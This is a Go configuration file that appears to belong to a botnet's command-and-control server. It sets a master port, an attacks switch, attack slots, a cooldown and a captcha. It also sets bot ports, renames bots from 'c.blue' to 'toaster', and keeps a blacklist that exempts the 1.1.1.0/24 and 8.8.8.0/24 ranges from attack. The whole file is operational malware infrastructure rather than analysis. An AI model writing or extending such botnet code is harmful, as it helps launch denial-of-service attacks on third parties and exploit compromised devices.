package config

import (
	charmLog "github.com/charmbracelet/log"
	"os"
	"time"
)

type master struct {
	MasterPort     int  `toml:"master"`
	Attacks        bool `toml:"attacks"`
	Captcha        bool `toml:"captcha"`
	AttackSlots    int  `toml:"attack_slots"`
	GlobalCooldown int  `toml:"global_cooldown"`
}

type slave struct {
	SlavePortLegacy int          `toml:"legacy_slave_port"`
	SlavePort       int          `toml:"slave_port"`
	SlaveName       []*SlaveName `toml:"slave_name"`
}

type blacklist struct {
	Enabled     bool      `toml:"enabled"`
	AdminBypass bool      `toml:"admin_bypass"`
	Blacklist   []*Target `toml:"blacklisted"`
}

type Target struct {
	Prefix  string `toml:"prefix"`
	Netmask uint8  `toml:"netmask"`
}

type SlaveName struct {
	OldName string `toml:"old_name"`
	NewName string `toml:"new_name"`
}

var Master = &master{
	MasterPort:     52154,
	Attacks:        true,
	Captcha:        true,
	AttackSlots:    5,
	GlobalCooldown: 60,
}

var Slave = &slave{
	SlavePort: 35348,
	SlaveName: []*SlaveName{
		{
			OldName: "c.blue",
			NewName: "toaster",
		},
	},
}

var Blacklist = &blacklist{
	Enabled: true,
	Blacklist: []*Target{
		{Prefix: "1.1.1.0", Netmask: 24},
		{Prefix: "8.8.8.0", Netmask: 24},
	},
}

var (
	Logger = charmLog.NewWithOptions(os.Stderr, charmLog.Options{
		ReportTimestamp: true,
		TimeFormat:      time.Kitchen,
	})
)
